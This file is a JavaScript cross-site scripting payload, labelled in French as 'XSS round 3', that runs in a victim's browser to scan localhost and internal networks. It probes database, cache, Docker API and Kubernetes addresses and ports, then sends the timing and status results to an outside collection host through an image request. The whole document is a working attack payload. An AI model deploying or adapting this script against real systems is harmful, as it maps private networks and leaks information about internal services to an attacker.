// Vantage — XSS round 3 : scan localhost + réseau interne
(function () {
  var L = 'http://10.139.19.116:9001/';
  var results = [];
  var done = 0;
  function report() {
    var out = results.join('|');
    try { new Image().src = L + 'scan?d=' + encodeURIComponent(out); } catch (e) {}
  }
  function probe(url, label) {
    var t0 = Date.now();
    fetch(url, { mode: 'no-cors', credentials: 'omit' })
      .then(function (r) { results.push(label + '=HTTP' + r.status + '(' + (Date.now() - t0) + 'ms)'); })
      .catch(function () { results.push(label + '=ERR(' + (Date.now() - t0) + 'ms)'); })
      .then(function () { if (++done === TOTAL) report(); });
  }
  var urls = [];
  [80, 81, 3000, 4000, 5000, 6379, 7000, 8000, 8080, 8081, 8443, 8888, 9000, 9090, 9200, 11211, 5432, 3306, 27017].forEach(function (p) {
    urls.push(['http://127.0.0.1:' + p + '/', 'l' + p]);
    urls.push(['http://localhost:' + p + '/', 'h' + p]);
  });
  ['proxy', 'db', 'postgres', 'pg', 'nginx', 'web', 'app', 'redis', 'cache'].forEach(function (h, i) {
    urls.push(['http://' + h + ':80/', h]);
    urls.push(['http://' + h + ':8080/', h + '8080']);
    urls.push(['http://' + h + ':6379/', h + '6379']);
  });
  for (var ip = 5; ip <= 30; ip++) {
    urls.push(['http://10.96.2.' + ip + ':80/', 'n' + ip]);
    urls.push(['http://10.96.2.' + ip + ':8080/', 'm' + ip]);
  }
  ['http://172.17.0.1:80/', 'gw80', 'http://172.17.0.1:2375/', 'docker', 'http://10.96.0.1:80/', 'kubegw'].forEach(function (v, i) {
    if (i % 2 === 0) urls.push([v, 'g' + (i / 2)]);
  });
  var TOTAL = urls.length;
  urls.forEach(function (u) { probe(u[0], u[1]); });
  setTimeout(report, 15000);
})();
